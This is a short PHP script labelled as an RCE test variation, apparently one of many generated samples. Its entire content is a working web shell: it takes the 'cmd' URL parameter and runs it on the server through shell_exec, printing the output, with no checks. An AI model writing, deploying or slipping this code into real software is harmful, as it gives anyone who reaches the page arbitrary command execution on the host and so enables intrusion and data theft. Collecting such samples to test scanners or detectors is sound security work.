<?php
// RCE test variation #934
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>